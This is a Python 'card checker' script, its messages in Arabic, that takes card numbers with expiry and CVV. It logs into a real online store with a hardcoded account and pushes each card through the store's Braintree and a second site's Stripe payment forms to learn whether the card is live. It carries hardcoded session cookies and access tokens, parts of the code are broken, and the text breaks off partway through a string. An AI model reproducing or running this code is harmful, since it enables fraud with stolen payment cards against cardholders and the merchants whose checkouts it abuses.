import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests


def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvv = ccx.split("|")[3]
	if "20" in yy:#fady
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'romanticdepot.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'es-CO,es-419;q=0.9,es;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://romanticdepot.com/store/my-account/',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	log = se.get('https://romanticdepot.com/store/my-account/',  headers=headers).text
	
	
	nonce = BeautifulSoup(log, 'html.parser').find('input', {'name':'woocommerce-login-nonce'})['value']
	
	
	headers = {
	    'authority': 'romanticdepot.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'es-CO,es-419;q=0.9,es;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://romanticdepot.com',
	    'referer': 'https://romanticdepot.com/store/my-account/',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'username': 'hack1king555@gmail.com',
	    'password': 'https://romanticdepot.com/store/my-account/add-payment-method/',
	    'woocommerce-login-nonce': nonce,
	    '_wp_http_referer': '/store/my-account/',
	    'login': 'Log in',
	}
	
	access = response.post('https://romanticdepot.com/store/my-account/', headers=headers, data=data)
	
	
	headers = {
	    'authority': 'romanticdepot.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'es-CO,es-419;q=0.9,es;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://romanticdepot.com/store/my-account/payment-methods/',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	add_get = se.get('https://romanticdepot.com/store/my-account/add-payment-method/', headers=headers).text
	
	nonce2 = BeautifulSoup(add_get, 'html.parser').find('input', {'name':'woocommerce-add-payment-method-nonce'})['value']
	
	bearer = (add_get.split('var wc_braintree_client_token = ["')[1]).split('"];')[0]
	bearer = json.loads(base64.b64decode(bearer))
	bearer2 = bearer['authorizationFingerprint']
	
	
	
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQwODg0MTYsImp0aSI6IjMwMWFhNGI2LTQyYjctNDA2MC1hMjY2LTgwZmJmOGMwNDdlYyIsInN1YiI6Inl5a2tuM2dzamJkOWd3bXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inl5a2tuM2dzamJkOWd3bXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoicmRlcG90bGxjX2luc3RhbnQifX0.pOXLC_5dzSEfHgWWVizzu21hO55vlkSRa8g0iecJzXzich7UEWGpxZcMwRfvodrAyWnMTo58N6L7brloO9M5VQ',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '8b7e432a-abd5-442f-9ca8-e1cc389cb570',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'G',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	token = response.json()['data']['tokenizeCreditCard']['token']
	print(token)
	
	
	
	
	
	cookies = {
    'wordpress_logged_in_563ee5d045a52c3354d96d1679deed08': 'hack1king555%7C1735208067%7CUwEZEN5UhKFHxSkLvvmoJurvaNq01M4fBDYfVJWsPVg%7Cee3bda1a7cbc6f364785bab902ade09276a410c799b651d916a6e7fd4d66a9a7',
    'wp_woocommerce_session_563ee5d045a52c3354d96d1679deed08': '71798%7C%7C1734171220%7C%7C1734167620%7C%7C8eb1ad842c925e01f78abe880ccdc22d',
    'wfwaf-authcookie-a8eed12ca58c4a8ba28bafb96cef98c1': '71798%7Cother%7Cread%7C6ccbcc2f9571d4a11a921dd1b4eebe2747696d219ce8529b5c7b8296066d3fe3',
    'mailchimp_landing_site': 'https%3A%2F%2Fromanticdepot.com%2Fstore%2Fstore%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-12-12%2010%3A13%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fromanticdepot.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-12-12%2010%3A13%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fromanticdepot.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fromanticdepot.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%22%2C%22session_start_time%22%3A%222024-12-12%2010%3A13%3A43%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    '_gcl_au': '1.1.1469487610.1733998424',
    'mf_user': 'dfa41b3078c28a2d640db78f293381c7|',
    '_ga': 'GA1.1.1810084413.1733998424',
    'mailchimp_user_previous_email': 'hack1king555%40gmail.com',
    'mailchimp_user_email': 'hack1king555%40gmail.com',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_current': '%C2%9E%C3%A9e',
    'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fromanticdepot.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_X0XSY8FYFN': 'GS1.1.1734002001.2.1.1734002017.44.0.0',
    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJiYmJHUF9qbDdKNkdac0NtczJsZ0xaaDlxNkM2dmNuR2x2dlpGUS1wbklRLlhpQVdTWCJ9',
    'mf_1383cd14-d2a4-4fbb-bd0f-54989745977e': 'e16b407289480eb5c4bc013c40515d70|121221461a12167a455c2fcfdf285cb0ff3bf8dd.1478867146.1734002001159$121233559697209ca025f48b5ad06e0894b641ab.1478867146.1734002013163$12123720b60d62b68568d61f87cbd49932a92944.-1681047147.1734002017430|1734002095438||3||||1|18.18|9.99711',
}

	headers = {
    'authority': 'romanticdepot.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'wordpress_logged_in_563ee5d045a52c3354d96d1679deed08=hack1king555%7C1735208067%7CUwEZEN5UhKFHxSkLvvmoJurvaNq01M4fBDYfVJWsPVg%7Cee3bda1a7cbc6f364785bab902ade09276a410c799b651d916a6e7fd4d66a9a7; wp_woocommerce_session_563ee5d045a52c3354d96d1679deed08=71798%7C%7C1734171220%7C%7C1734167620%7C%7C8eb1ad842c925e01f78abe880ccdc22d; wfwaf-authcookie-a8eed12ca58c4a8ba28bafb96cef98c1=71798%7Cother%7Cread%7C6ccbcc2f9571d4a11a921dd1b4eebe2747696d219ce8529b5c7b8296066d3fe3; mailchimp_landing_site=https%3A%2F%2Fromanticdepot.com%2Fstore%2Fstore%2Fmy-account%2Fadd-payment-method%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-12%2010%3A13%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fromanticdepot.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-12%2010%3A13%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fromanticdepot.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fromanticdepot.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%22%2C%22session_start_time%22%3A%222024-12-12%2010%3A13%3A43%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; _gcl_au=1.1.1469487610.1733998424; mf_user=dfa41b3078c28a2d640db78f293381c7|; _ga=GA1.1.1810084413.1733998424; mailchimp_user_previous_email=hack1king555%40gmail.com; mailchimp_user_email=hack1king555%40gmail.com; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_current=%C2%9E%C3%A9e; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fromanticdepot.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F; _ga_X0XSY8FYFN=GS1.1.1734002001.2.1.1734002017.44.0.0; __kla_id=eyIkZXhjaGFuZ2VfaWQiOiJiYmJHUF9qbDdKNkdac0NtczJsZ0xaaDlxNkM2dmNuR2x2dlpGUS1wbklRLlhpQVdTWCJ9; mf_1383cd14-d2a4-4fbb-bd0f-54989745977e=e16b407289480eb5c4bc013c40515d70|121221461a12167a455c2fcfdf285cb0ff3bf8dd.1478867146.1734002001159$121233559697209ca025f48b5ad06e0894b641ab.1478867146.1734002013163$12123720b60d62b68568d61f87cbd49932a92944.-1681047147.1734002017430|1734002095438||3||||1|18.18|9.99711',
    'origin': 'https://romanticdepot.com',
    'pragma': 'no-cache',
    'referer': 'https://romanticdepot.com/store/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': token,
    'braintree_cc_device_data': '{"device_session_id":"8d382795d0b59ac3810ac8afd98a70d8","fraud_merchant_id":null,"correlation_id":"8b7e432a-abd5-442f-9ca8-e1cc389c"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/yykkn3gsjbd9gwms/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/yykkn3gsjbd9gwms"},"merchantId":"yykkn3gsjbd9gwms","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"yykkn3gsjbd9gwms","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"RDepot LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQwODg0MTgsImp0aSI6IjU3N2ZiMmFjLTc4NzEtNGRkNy05MGIwLTkzNzQzY2NhNDMyNyIsInN1YiI6Inl5a2tuM2dzamJkOWd3bXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inl5a2tuM2dzamJkOWd3bXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.Puv-HmLmwvVrWt8dZ4WwkX_BTBPClAQB7pHTA6zbkTIZeG71AQS8NuFtoR3a2VpgbXSu-1zVDZ2tbZ-rewfw1w","paypalClientId":"AfwIL-cFTwlaBeUa_93XHy1sF5jkDSaG76UZVgWKBbA7aPK9GVJ8sWJjEnpO6TnLD_J3jHD8lgL65nDp","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3409271549654466861","accessToken":"access_token$production$yykkn3gsjbd9gwms$3bb95f9b76126eda6a7d648b2c52e74b","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"RDepot LLC","clientId":"AfwIL-cFTwlaBeUa_93XHy1sF5jkDSaG76UZVgWKBbA7aPK9GVJ8sWJjEnpO6TnLD_J3jHD8lgL65nDp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"rdepotllc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': '7213bd36aa',
    '_wp_http_referer': '/store/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://romanticdepot.com/store/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)		
		
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
#Strip CH	
	
def st(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = f'type=card&billing_details[name]=yusuf&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bf6d1134-90bb-47eb-b27c-cfc553d0d0275e6fb4&muid=ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5&sid=e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=26722&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZCW7j7pIUIasVSFAhqmDTpFl1MOc3hCNLeTdMbXXZDXJtc7EEBdupR-viL6YJAe666AFogrL2w_Z_jeeq_WrrWz9DU95GeMgduzRcqsJ4ZQ_B28EBX6EdZGAP8X-QMFabUEqf3A_92-8Kf3pwCOMCcJoGtNZ54AjbjiW0fDIgiuDys_FzfbpM98wbcHYau6mvUBA0e3siBypNANfVlpuJ2WNlRnqwSGCD_jMUgOXF1dlNBPsWZf8tfJxMZjnP2hxTIhMjtxK2AgFXjGnC9Uzsf-ukzOqWuAcW1wuwUpIbKKg-I2V1hdu9H7hKlMUqpiafuXwTIGo3uV26RB-0wgpxfxCDcNw_2gju90MNok3n9SGvdJsUvdnE4IPXXGpoHoOZsXYhHDKVv1UgrdpRRZ1-YtBqZU-4CXqFRJqc3WJY4QsyLc_z604Wj71bNdraah6JYUDpVWbQbhRrECyCXzNAuh39fOGePihu29ZddIEJ2mVS4ywX9mFP9AQIYruW-TpIH0Z_gBEOMNYNthQPpSuhwD70otqxo8Z8YWaGbr0oz-gUGfeXdvddhssZ_btpwWpoBPPdtzgKJDJ8ddYm8Hw6rPsDCgeKBE9z_UD4gEmBQAEyh5MXzszB6RZDTzXDVSjdRP8jmxdIETr6JWBs5Yj-swDfvd8k39oyPjPwb-u7qV8E5wUWErU-VlmqKNhxSsPioAMmq8JCqs5cYEro551dTO___JAbHEO4cDkBO0sV_JEtk_bk1GhlsHoHd9r-KaQgzvyO1bc8bMIAoS1u7DdaJbyko_tSC_1YdU_yapn0QioKl-oNt3Gp9c6eSOSHh-_xWYgKONQnxsvGh9JPsHLGPeUTV5ENIVB_K0ho8tVuYhaDJgp_55DKf2DjFFIkWWONxze9k7hpcgIbAAP9geqKmDe22mVW65V8zi6XcYKxqh14IGpPBof1Qw9bg63BmdHyURpUnuzhVeIy5hlj6AUCf1DrenRP5P7N3S8ZcDCELdNKLPWw0MbmaPxeTiME6__aPv7UhywP4VpyvanP3g8x2z9i9CWDoUbXi5opRf6amMq5QBxom3-bIOiZ5r9YgVyky4NJTGHUzRdX54YAOlCU1NE5Ja-oZQTd_ZwqdwhdOZIx6Ohs2eM-6dCwZDxxV6YZBs18FsPaXfQcPg4FKCpC83YlS8lUqaDjpeTzwzH1fahftakgDQTXxHd-62RWZ_SIcBZNDKOmrYp1-yGdFDRU_Mi70rQGFV0I94ffINMzgoVnUeufZ7mUI6XXnY8AUJhyiGJK2eRK0k3oeyDCm5CXy-4wqLJHYKRbGtTqaD9OMeYrBtRYymuUrMeKce-L845X_BJc4eG1ZIxMbx4bpdxhBrpplb3jSaEMywT3oyvRxbQ3El72cyPCR_qeqDP0qsBk98pyrQdF6g8D8_nxtRChhNzDF-X6VLCmXeYU9t9-bWcgz-KLPVOdRnHt_TG2Ks4gqPjqpFMkSl1zM0vtv9KJ-IEwjZdA11r75ZGsrV5Fnyr5nXyMzw5jAO8h8bSwYrCAfk4IKnhcFiy_gymuVFGW5QMrZWDeZ65KS6bzNH96KAapgTH9Mz4SzuffJ_mTR9jtj4xQkZkYXCsAdJNyywUDxU8Cs_kKgx99aD2zKEhKTJnuzR8B9igZRrHXPTSl5qzfx3A9uIRGq_1RSzrY0ryINfuIEYUAYO8D8gfD6nqW1JP9W9tWTl0CtdIolnbROW0jZGyXGdgAREP4HeNO5AlQVO_lqeJcVMEkIlUvIFDWJIfnJX0i04r_dkWmRrTD4Vsxzo9VJ2gcYNax47IzFy39pylB5tvn-RMqCZ1jOdxinqnihRRyx33sODLSExvjb75saIxJl73YAb_3C_8W8AFCYMIR7ifZQsyyedZJIJkBlb01ody9eS9uKPwUGVmDxKXzV0ErDzq290JOPuKrbYo0i2hBqw9OqkbuXkdcgMd3GJpUeEqLgGBiInTEafQwrvPSefCHhK-fXo_J7Hqx-bMYPjYimWEI_7zXJWA3dg_hw1O8gZel8vsy5JMgjeBFg7vb9svzaO9f9im4X6_FUgEczenMJyX_GsDJ4BH4KIS9t8uPwEBosa4vjAX257benu0lZAWO1EkS7IBImfgDptyB2JM4Co2V4cM5mVf7XqHNoYXJkX2lkzhQ8hB-ia3KnYTZhOWNjYaJwZAA.4L5u6H3jmOK658HDQbM2pr46esOmTm84BOlgILEozLE'

	resoponse = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	ide = (resoponse.json()['id'])
	
	cookies = {
    'ahoy_visitor': 'aa9059eb-6025-4c9c-8c93-06b2e7f66bf1',
    'ahoy_visit': '80f8e7d9-33d9-4a44-a389-d3886d799439',
    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%2C%22consentId%22%3A%2208a387aa-0eaa-4cea-a8f8-01818d60d128%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%7D',
    '_gcl_au': '1.1.191496317.1716898280',
    '_gid': 'GA1.2.1548126584.1716898280',
    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3',
    'unsecure_is_signed_in': '1',
    '_cioid': '11296645',
    'intercom-device-id-frdatdus': '65896fd8-9074-419f-82af-44775a9800f5',
    '__stripe_mid': 'ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5',
    '__stripe_sid': 'e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d',
    '_gat_UA-97995424-1': '1',
    '_ga': 'GA1.1.1213546217.1716898279',
    '_ga_4T8KCV9Y2D': 'GS1.1.1716911386.2.1.1716911702.60.0.0',
    'intercom-session-frdatdus': 'WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d',
    '_transcribe_session': 'GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7i9hGPm8d%2F%2BvqYGQ2QPMPZYvQ34snlJ8u%2FbZ%2FTJIQGhejj5W3p3Ow%3D%3D--fnFcV2OENluq4BD%2B--KIoAKM2gNf00FVX7WVRRMA%3D%3D',
}

	headers = {
    'authority': 'www.happyscribe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer OQRJtXO8dyPUQ3DMs8deCgtt',
    'content-type': 'application/json',
    # 'cookie': 'ahoy_visitor=aa9059eb-6025-4c9c-8c93-06b2e7f66bf1; ahoy_visit=80f8e7d9-33d9-4a44-a389-d3886d799439; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%2C%22consentId%22%3A%2208a387aa-0eaa-4cea-a8f8-01818d60d128%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%7D; _gcl_au=1.1.191496317.1716898280; _gid=GA1.2.1548126584.1716898280; 